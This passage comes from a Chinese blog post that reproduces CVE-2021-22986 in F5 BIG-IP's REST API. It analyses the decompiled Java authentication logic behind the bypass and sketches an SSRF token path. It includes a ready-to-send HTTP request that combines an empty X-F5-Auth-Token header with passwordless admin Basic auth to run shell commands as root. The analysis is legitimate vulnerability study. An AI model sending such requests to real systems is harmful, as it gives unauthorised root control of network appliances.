</div><p>这里的AUTHZ_WORKER_URI_PATH又定义为</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>static</span> <span class=kd>final</span> <span class=n>String</span> <span class=n>AUTHZ_USERS_WORKER_URI_PATH</span> <span class=o>=</span> <span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>AUTHZ_WORKER_URI_PATH</span><span class=o>,</span> <span class=s>&#34;users&#34;</span> <span class=o>});</span>
</code></pre></td></tr></table>
</div>
</div><p>该class对request进行拆解获取其的变量，request变量内容如下</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=n>identityData</span><span class=o>.</span><span class=na>userName</span> <span class=o>=</span> <span class=err>&#39;</span><span class=n>admin</span><span class=err>&#39;</span><span class=o>;</span>
<span class=n>identityData</span><span class=o>.</span><span class=na>userReference</span> <span class=o>=</span> <span class=err>&#39;</span><span class=n>http</span><span class=o>:</span><span class=c1>//localhost/mgmt/shared/authz/users/admin&#39;
</span><span class=c1></span><span class=n>identityData</span><span class=o>.</span><span class=na>groupReference</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</code></pre></td></tr></table>
</div>
</div><p>我们可以看到identityData只保存了userName而没有保存Password。这是因为REST服务器默认Basic Authorization数据已经由Apache进行认证，所以不需要重新验证账号密码，所以在Jetty服务端就只根据用户名。
F5.rest.jar中有authn和authz两种class。authn有BIG-IPAuthCookie以及其他与BIG-IP有关的cookie，而authz库中只有basic auth相关的方法函数。因此判断出若请求中有BIG-IP相关的Cookie则由authn认证，若有Authorization则有authz进行认证。</p>
<p>在jetty服务中会发生第二个bypass authorization。该pypass发生在<strong>f5.rest.workers.EvaluatePermissions.class</strong>中</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>private</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>completeEvaluatePermission</span><span class=o>(</span><span class=kd>final</span> <span class=n>RestOperation</span> <span class=n>request</span><span class=o>,</span> <span class=n>AuthTokenItemState</span> <span class=n>token</span><span class=o>,</span> <span class=kd>final</span> <span class=n>CompletionHandler</span><span class=o>&lt;</span><span class=n>Void</span><span class=o>&gt;</span> <span class=n>finalCompletion</span><span class=o>)</span> <span class=o>{</span>
    <span class=kd>final</span> <span class=n>String</span> <span class=n>path</span><span class=o>;</span>
    <span class=c1>// 1. 因为bypass中X-f5-Auth-Token为空，所以token没有值， 所以是null，绕过第一个F5 token的认证
</span><span class=c1></span>    <span class=k>if</span> <span class=o>(</span><span class=n>token</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
      <span class=k>if</span> <span class=o>(</span><span class=n>token</span><span class=o>.</span><span class=na>expirationMicros</span><span class=o>.</span><span class=na>longValue</span><span class=o>()</span> <span class=o>&lt;</span> <span class=n>RestHelper</span><span class=o>.</span><span class=na>getNowMicrosUtc</span><span class=o>())</span> <span class=o>{</span>
        <span class=n>String</span> <span class=n>error</span> <span class=o>=</span> <span class=s>&#34;X-F5-Auth-Token has expired.&#34;</span><span class=o>;</span>
        <span class=n>setStatusUnauthorized</span><span class=o>(</span><span class=n>request</span><span class=o>);</span>
        <span class=n>finalCompletion</span><span class=o>.</span><span class=na>failed</span><span class=o>(</span><span class=k>new</span> <span class=n>SecurityException</span><span class=o>(</span><span class=n>error</span><span class=o>),</span> <span class=kc>null</span><span class=o>);</span>

        <span class=k>return</span><span class=o>;</span>
      <span class=o>}</span>
      <span class=n>request</span><span class=o>.</span><span class=na>setXF5AuthTokenState</span><span class=o>(</span><span class=n>token</span><span class=o>);</span>
    <span class=o>}</span>

    <span class=c1>// 2. 此处的request是前面返回的request变量，即identityData中的数据，这个setBasicAuthFromIdentity仅将identity.userName重新进行编码，并不会查看密码，而且identityData里也没有存密码。
</span><span class=c1></span>    <span class=n>request</span><span class=o>.</span><span class=na>setBasicAuthFromIdentity</span><span class=o>();</span>

    <span class=c1>//3. 由于uri不符合所以跳过以下两个比较
</span><span class=c1></span>    <span class=k>if</span> <span class=o>(</span><span class=n>request</span><span class=o>.</span><span class=na>getUri</span><span class=o>().</span><span class=na>getPath</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=n>EXTERNAL_LOGIN_WORKER</span><span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=n>request</span><span class=o>.</span><span class=na>getMethod</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=n>RestOperation</span><span class=o>.</span><span class=na>RestMethod</span><span class=o>.</span><span class=na>POST</span><span class=o>))</span> <span class=o>{</span>
      <span class=n>finalCompletion</span><span class=o>.</span><span class=na>completed</span><span class=o>(</span><span class=kc>null</span><span class=o>);</span>
      <span class=k>return</span><span class=o>;</span>
    <span class=o>}</span>

    <span class=k>if</span> <span class=o>(</span><span class=n>request</span><span class=o>.</span><span class=na>getUri</span><span class=o>().</span><span class=na>getPath</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>EXTERNAL_LOGIN_WORKER</span><span class=o>,</span> <span class=s>&#34;available&#34;</span> <span class=o>}))</span> <span class=o>&amp;&amp;</span> <span class=n>request</span><span class=o>.</span><span class=na>getMethod</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=n>RestOperation</span><span class=o>.</span><span class=na>RestMethod</span><span class=o>.</span><span class=na>GET</span><span class=o>))</span> <span class=o>{</span>
      <span class=n>finalCompletion</span><span class=o>.</span><span class=na>completed</span><span class=o>(</span><span class=kc>null</span><span class=o>);</span>
      <span class=k>return</span><span class=o>;</span>
    <span class=o>}</span>

     <span class=c1>//4. 此处的userRef是admin的ref，因为basic auth的用户名是admin,形式应该为identityData.UserReference
</span><span class=c1></span>    <span class=kd>final</span> <span class=n>RestReference</span> <span class=n>userRef</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=na>getAuthUserReference</span><span class=o>();</span>

    <span class=c1>//若userRef为空
</span><span class=c1></span>    <span class=k>if</span> <span class=o>(</span><span class=n>RestReference</span><span class=o>.</span><span class=na>isNullOrEmpty</span><span class=o>(</span><span class=n>userRef</span><span class=o>))</span> <span class=o>{</span>
      <span class=n>String</span> <span class=n>error</span> <span class=o>=</span> <span class=s>&#34;Authorization failed: no user authentication header or token detected. Uri:&#34;</span> <span class=o>+</span> <span class=n>request</span><span class=o>.</span><span class=na>getUri</span><span class=o>()</span> <span class=o>+</span> <span class=s>&#34; Referrer:&#34;</span> <span class=o>+</span> <span class=n>request</span><span class=o>.</span><span class=na>getReferer</span><span class=o>()</span> <span class=o>+</span> <span class=s>&#34; Sender:&#34;</span> <span class=o>+</span> <span class=n>request</span><span class=o>.</span><span class=na>getRemoteSender</span><span class=o>();</span>
      <span class=n>setStatusUnauthorized</span><span class=o>(</span><span class=n>request</span><span class=o>);</span>
      <span class=n>finalCompletion</span><span class=o>.</span><span class=na>failed</span><span class=o>(</span><span class=k>new</span> <span class=n>SecurityException</span><span class=o>(</span><span class=n>error</span><span class=o>),</span> <span class=kc>null</span><span class=o>);</span>
      <span class=k>return</span><span class=o>;</span>
    <span class=o>}</span>

    <span class=c1>//因为admin是DefaultAdminRef， 所以认证成功
</span><span class=c1></span>    <span class=k>if</span> <span class=o>(</span><span class=n>AuthzHelper</span><span class=o>.</span><span class=na>isDefaultAdminRef</span><span class=o>(</span><span class=n>userRef</span><span class=o>))</span> <span class=o>{</span>
      <span class=n>finalCompletion</span><span class=o>.</span><span class=na>completed</span><span class=o>(</span><span class=kc>null</span><span class=o>);</span>
      <span class=k>return</span><span class=o>;</span>
    <span class=o>}</span>
      <span class=c1>//认证成功所以并不会执行以下所有代码
</span><span class=c1></span>      <span class=o>......(</span><span class=n>后面还有一段</span><span class=err>，</span><span class=n>但认证成功就不会执行了</span><span class=o>)</span>
</code></pre></td></tr></table>
</div>
</div><p>对于第2条2.注释的setBasicAuthFromIdentity我们可以看下它是如何对Identity数据处理的</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kt>void</span> <span class=nf>setBasicAuthFromIdentity</span><span class=o>()</span> <span class=o>{</span>
   <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>authorizationData</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span>
     <span class=k>return</span><span class=o>;</span>
   <span class=k>this</span><span class=o>.</span><span class=na>authorizationData</span><span class=o>.</span><span class=na>basicAuthValue</span> <span class=o>=</span> <span class=n>AuthzHelper</span><span class=o>.</span><span class=na>encodeBasicAuth</span><span class=o>(</span><span class=n>getAuthUser</span><span class=o>(),</span> <span class=kc>null</span><span class=o>);</span>
 <span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>再看getAuthUser的代码</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=n>String</span> <span class=nf>getAuthUser</span><span class=o>()</span> <span class=o>{</span>
  <span class=k>return</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>identityData</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>?</span> <span class=kc>null</span> <span class=o>:</span> <span class=k>this</span><span class=o>.</span><span class=na>identityData</span><span class=o>.</span><span class=na>userName</span><span class=o>;</span>
<span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>可以看出getAuthUser仅仅获取了identityData的userName数据
encodeBasicAuth实现如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>static</span> <span class=n>String</span> <span class=nf>encodeBasicAuth</span><span class=o>(</span><span class=n>String</span> <span class=n>user</span><span class=o>,</span> <span class=n>String</span> <span class=n>password</span><span class=o>)</span> <span class=o>{</span>
  <span class=k>if</span> <span class=o>(</span><span class=n>user</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span>
    <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
  <span class=n>String</span> <span class=n>userPass</span> <span class=o>=</span> <span class=n>String</span><span class=o>.</span><span class=na>format</span><span class=o>(</span><span class=s>&#34;%s:%s&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>Object</span><span class=o>[]</span> <span class=o>{</span> <span class=n>user</span><span class=o>,</span> <span class=o>(</span><span class=n>password</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>?</span> <span class=s>&#34;&#34;</span> <span class=o>:</span> <span class=n>password</span> <span class=o>});</span>
  <span class=k>return</span> <span class=n>DatatypeConverter</span><span class=o>.</span><span class=na>printBase64Binary</span><span class=o>(</span><span class=n>userPass</span><span class=o>.</span><span class=na>getBytes</span><span class=o>());</span>
<span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>因为encodeBasicAuth的第二个参数传入的为NULL，因此encodeBasicAuth就是对user:null进行Base64的编码处理，可以看出其并没有采用Authorization中的用户名和密码，而是将密码置NULL
再到第三条3.注释的两个if代码，是进行Uri路径匹配，其中EXTERNAL_LOGIN_WORKER对应的是</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>static</span> <span class=kd>final</span> <span class=n>String</span> <span class=n>WORKER_URI_PATH</span> <span class=o>=</span> <span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=s>&#34;shared/&#34;</span><span class=o>,</span> <span class=s>&#34;authn&#34;</span><span class=o>,</span> <span class=s>&#34;login&#34;</span> <span class=o>});</span>
</code></pre></td></tr></table>
</div>
</div><p>即uri = shared/authn/login，但是我们访问的uri却是shared/authz/users/admin?是这个原因导致的不匹配吗。(还是说对比的uri是tm/util/bash，然后才导致的不匹配？)
当上述两个if的uri匹配失败则调用getAuthUserReference函数，又因为authUserReference非空，因此跳过下面的if
接着判断userRef是否是DefaultAdminRef。
isDefaultAdminRef函数代码如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>static</span> <span class=kt>boolean</span> <span class=nf>isDefaultAdminRef</span><span class=o>(</span><span class=n>RestReference</span> <span class=n>userReference</span><span class=o>)</span> <span class=o>{</span>
  <span class=n>RestReference</span> <span class=n>defaultReference</span> <span class=o>=</span> <span class=n>getDefaultAdminReference</span><span class=o>();</span>
  <span class=k>return</span> <span class=o>(</span><span class=n>defaultReference</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>defaultReference</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=n>userReference</span><span class=o>));</span>
<span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>那么其中的就是getDefaultAdminReference就是获取DefaultAdminReference的关键了，其代码如下</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>static</span> <span class=n>RestReference</span> <span class=nf>getDefaultAdminReference</span><span class=o>()</span> <span class=o>{</span>
  <span class=k>if</span> <span class=o>(</span><span class=n>DEFAULT_ADMIN_NAME</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span>
    <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
  <span class=k>return</span> <span class=k>new</span> <span class=n>RestReference</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildPublicUri</span><span class=o>(</span><span class=n>UrlHelper</span><span class=o>.</span><span class=na>buildUriPath</span><span class=o>(</span><span class=k>new</span> <span class=n>String</span><span class=o>[]</span> <span class=o>{</span> <span class=n>WellKnownPorts</span><span class=o>.</span><span class=na>AUTHZ_USERS_WORKER_URI_PATH</span><span class=o>,</span> <span class=n>DEFAULT_ADMIN_NAME</span> <span class=o>})));</span>
<span class=o>}</span>
</code></pre></td></tr></table>
</div>
</div><p>这里的DEFAULT_ADMIN_NAME定义如下</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-java data-lang=java>
<span class=kd>public</span> <span class=kd>static</span> <span class=n>String</span> <span class=n>DEFAULT_ADMIN_NAME</span> <span class=o>=</span> <span class=s>&#34;admin&#34;</span><span class=o>;</span>

</code></pre></td></tr></table>
</div>
</div><p>而AUHZ_USERS_WORER_URI_PATH在前面也提到过了。最后的DefaultAdminRef就是shared/authz/users/admin，与identity.userReference相同因此进入if并return，不会再执行后面的代码。</p>
<p>总结一下，首先http请求经过Apache服务时，发生一次身份认证，如果存在X-F5-Token就不会检验basic auth的正确性，与X-F5-Token的有效性也无关。request通过Apache传递到Jetty服务后，会判断X-F5-Token是否为空，为空即跳过第一步Jetty验证，接着会判断IdentityData.usereference是否为默认的admin的reference，如果是则通过验证，这第二次bypass就是利用了jetty服务不会对通过httpd认证的请求进行二次认证的缺陷。因此我们只需要伪造一个有着空的X-F5-Token以及用户名正确，而密码错误的报文即可绕过两次身份验证。</p>
<p>我们通过Burpsuit进行发包检测我们的原理分析是否正确
我们使用Burpsuit的proxy对https://<host>/mgmt/tm/util/bash进行抓包，然后在repeater中对该报文进行改包再发送进行测试。</p>
<ul>
<li>当只添加X-F5-Token字段时</li>
</ul>
<p><img class=lazyload src=/svg/loading.min.svg data-src=onlytoken.png data-srcset="/cve-2021-22986/onlytoken.png, onlytoken.png 1.5x, /cve-2021-22986/onlytoken.png 2x" data-sizes=auto alt=/cve-2021-22986/onlytoken.png title=onlytoken></p>
<p>可以看到request可以发送给jetty服务。</p>
<ul>
<li>当只添加Authorization字段时</li>
</ul>
<p><img class=lazyload src=/svg/loading.min.svg data-src=onlyauthorization.png data-srcset="/cve-2021-22986/onlyauthorization.png, onlyauthorization.png 1.5x, /cve-2021-22986/onlyauthorization.png 2x" data-sizes=auto alt=/cve-2021-22986/onlyauthorization.png title=onlyauthorization></p>
<p>可以看到此时并没有通过apache服务的验证，并且在下面的文本提示中显示"Unauthorized&rdquo;，并且说明验证未通过。
这里有同学可能会疑惑，Authorization字段内容为什么是 Basic和一段加密密码呢？这是HTTP Basic Auth协议规定的。其规定的形式为</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C data-lang=C>    <span class=nl>Authorization</span><span class=p>:</span> <span class=n>Basic</span> <span class=n>base64encode</span><span class=p>(</span><span class=n>username</span><span class=o>+</span><span class=s>&#34;:&#34;</span><span class=o>+</span><span class=n>password</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>同时添加X-F5-Token和Authorization字段时</li>
</ul>
<p><img class=lazyload src=/svg/loading.min.svg data-src=tokenauth.png data-srcset="/cve-2021-22986/tokenauth.png, tokenauth.png 1.5x, /cve-2021-22986/tokenauth.png 2x" data-sizes=auto alt=/cve-2021-22986/tokenauth.png title=tokenauth></p>
<p>可以看到此时request也传递到了jetty服务中，通过对比实验，可以验证我们对漏洞原理的分析是正确的。</p>
<h5 id=0x21-ssrf>0x21 SSRF</h5>
<p>除了RCE漏洞，该软件还存在SSRF漏洞。</p>
<p>我们这里直接引用360的reference的结论，在f5.rest.jar中的<strong>com.f5.rest.workers.authn.AuthnWorker#onPost</strong>方法中增加了对loginReference.link的校验，那么由此可知onPost是SSRF漏洞的突破点。</p>
<p>当我们要构造漏洞利用报文，我们就需要知道需要构造哪些字段，哪些内容。在onPost方法中，如下图所示两个对象 - state与loginState，就是我们需要关注的输入点</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=inputpoint.png data-srcset="/cve-2021-22986/inputpoint.png, inputpoint.png 1.5x, /cve-2021-22986/inputpoint.png 2x" data-sizes=auto alt=/cve-2021-22986/inputpoint.png title=inputpoint></p>
<p>前面的结论中对loginReference.link添加了校验，而该变量存在于state对象中，因此该变量可控。同时也是关键。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ssrfcore.png data-srcset="/cve-2021-22986/ssrfcore.png, ssrfcore.png 1.5x, /cve-2021-22986/ssrfcore.png 2x" data-sizes=auto alt=/cve-2021-22986/ssrfcore.png title=ssrfcore></p>
<p>由上图可看到，sendPost会向state.loginReference发出请求。当post请求处理完成后未发生异常，就会执行completed()方法，该方法中会将访问loginReference.link返回的JSON数据根据字段赋值给loggedIn，然后会调用AuthWorker.generateToken()函数生成Token</p>
<p>再看generateToken()函数</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=generatetoken.png data-srcset="/cve-2021-22986/generatetoken.png, generatetoken.png 1.5x, /cve-2021-22986/generatetoken.png 2x" data-sizes=auto alt=/cve-2021-22986/generatetoken.png title=generatetoken></p>
<p>在generateToken函数中会将loggedIn各字段赋值给token对象，如果访问的loginReference.link目标url返回的json数据中userReference字段为null时，就会执行到如下代码</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=usernull.png data-srcset="/cve-2021-22986/usernull.png, usernull.png 1.5x, /cve-2021-22986/usernull.png 2x" data-sizes=auto alt=/cve-2021-22986/usernull.png title=usernull></p>
<p>收到的报文就会因此出现如下图所示的错误</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=nouserref.png data-srcset="/cve-2021-22986/nouserref.png, nouserref.png 1.5x, /cve-2021-22986/nouserref.png 2x" data-sizes=auto alt=/cve-2021-22986/nouserref.png title=nouserref></p>
<p>因此在构造报文的时候，填写的loginReference.link目标url必须返回userReference字段不为null的json数据。
这里直接给出结论，loginReference.link: /shared/gossip(/mgmt/shared/gossip)符合条件
继续往下看可以发现生成的token会通过completed()方法完成映射和返回。在completed()方法中存在RestOperation.complete()方法，作为处理请求结束的代码。</p>
<p>因此如果想要获得返回Token的报文，就需要寻找符合以下条件的子类:</p>
<ol>
<li>存在onPost方法可以处理POST请求</li>
<li>onPost方法中可以控制执行流到RestOperation.complete()方法中</li>
</ol>
<p>当response报文返回生成的token后，我们构造攻击报文，将其填入X-F5-Token中即可获取系统权限。</p>
<h4 id=0x3-漏洞利用>0x3 漏洞利用</h4>
<h5 id=0x30-rce>0x30 RCE</h5>
<p>因为我们已经得到结论，<strong>https://<host>/mgmt/tm/util/bash</strong> 路径是用来执行系统命令的，因此我们直接构造数据包，通过Burpsuit的Repeater功能进行发包获取权限，从而实现RCE漏洞利用。
构造的数据包如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=n>POST</span> <span class=o>/</span><span class=n>mgmt</span><span class=o>/</span><span class=n>tm</span><span class=o>/</span><span class=n>util</span><span class=o>/</span><span class=n>bash</span> <span class=n>HTTP</span><span class=o>/</span><span class=mf>1.1</span>
<span class=nl>Host</span><span class=p>:</span> <span class=mf>192.168.1</span><span class=n>xx</span><span class=mf>.1</span><span class=n>x</span>
<span class=n>X</span><span class=o>-</span><span class=n>F5</span><span class=o>-</span><span class=n>Auth</span><span class=o>-</span><span class=nl>Token</span><span class=p>:</span>
<span class=nl>Authorization</span><span class=p>:</span> <span class=n>Basic</span> <span class=n>YWRtaW46</span>
<span class=n>Content</span><span class=o>-</span><span class=nl>Length</span><span class=p>:</span> <span class=mi>55</span>

<span class=p>{</span>
    <span class=s>&#34;command&#34;</span><span class=o>:</span> <span class=s>&#34;run&#34;</span><span class=p>,</span>
    <span class=s>&#34;utilCmdArgs&#34;</span><span class=o>:</span> <span class=s>&#34;-c id&#34;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>Burpsuit结果，如下图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=exp.png data-srcset="/cve-2021-22986/exp.png, exp.png 1.5x, /cve-2021-22986/exp.png 2x" data-sizes=auto alt=/cve-2021-22986/exp.png title=exp></p>
<p>response报文返回了我们通过该报文获取的系统权限，uid=0,gid=0也正是linux系统下root的id号，因此我们夺取了系统的root权限。那么我们只需要构造这样的报文，在添加相应的执行命令即可实现RCE漏洞的利用，能够对系统进行威胁了。</p>
<h5 id=0x31-ssrf>0x31 SSRF</h5>
<p>首先我们需要构造POST报文获取生成Token，然后使用该Token再次生成报文从而拿下系统权限。</p>
<ul>
<li>获取Token的报文</li>
</ul>
<p><img class=lazyload src=/svg/loading.min.svg data-src=gettoken.png data-srcset="/cve-2021-22986/gettoken.png, gettoken.png 1.5x, /cve-2021-22986/gettoken.png 2x" data-sizes=auto alt=/cve-2021-22986/gettoken.png title=gettoken></p>
<p>得到的response报文</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=responsetoken.png data-srcset="/cve-2021-22986/responsetoken.png, responsetoken.png 1.5x, /cve-2021-22986/responsetoken.png 2x" data-sizes=auto alt=/cve-2021-22986/responsetoken.png title=responsetoken></p>
<ul>
<li>攻击报文</li>
</ul>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ssrfat.png data-srcset="/cve-2021-22986/ssrfat.png, ssrfat.png 1.5x, /cve-2021-22986/ssrfat.png 2x" data-sizes=auto alt=/cve-2021-22986/ssrfat.png title=ssrfat></p>
<p>可以看到返回的报文body显示当前权限为root权限</p>
<h4 id=0x4-总结>0x4 总结</h4>
<p>总结？总结都在前言写完了。这次博客写的真的很过瘾！虽然SSRF还是弄不太懂，虽然很多关键结论都是直接采用其他师傅的，而这些关键结论，以我现在的能力也很难获取，但是这次学习以及实现，是我第一次复现CVE，也让我深刻感受到，一个成果的获取，真的很困难，对能力的要求也非常的高，安全研究的路，崎岖。即便如此，我仍然愿意走下去。</p>
</div><div class=post-footer id=post-footer>
<div class=post-info>
<div class=post-info-line>
<div class=post-info-mod>
<span>更新于 2022-06-10</span>
</div>
<div class=post-info-license></div>
</div>
<div class=post-info-line>
<div class=post-info-md><span>
<a class=link-to-markdown href=/cve-2021-22986/index.md target=_blank>阅读原始文档</a>
</span></div>
<div class=post-info-share>
<span></span>
</div>
</div>
</div>
<div class=post-info-more>
<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/cve/>CVE</a></section>
<section>
<span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span>
</section>
</div>
<div class=post-nav><a href=/hooktechnique/ class=prev rel=prev title=常用Hook技术解析><i class="fas fa-angle-left fa-fw"></i>常用Hook技术解析</a>
<a href=/22-12-12/ class=next rel=next title=ELF文件延迟绑定过程与获取外部动态库函数对应的plt表项地址>ELF文件延迟绑定过程与获取外部动态库函数对应的plt表项地址<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id=comments><div id=utterances></div><noscript>
Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.
</noscript></div></article></div>
</main><footer class=footer>
<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>ShiDong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
</div>
</footer>
</div>
<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部>
<i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论>
<i class="fas fa-comment fa-fw"></i>
</a>
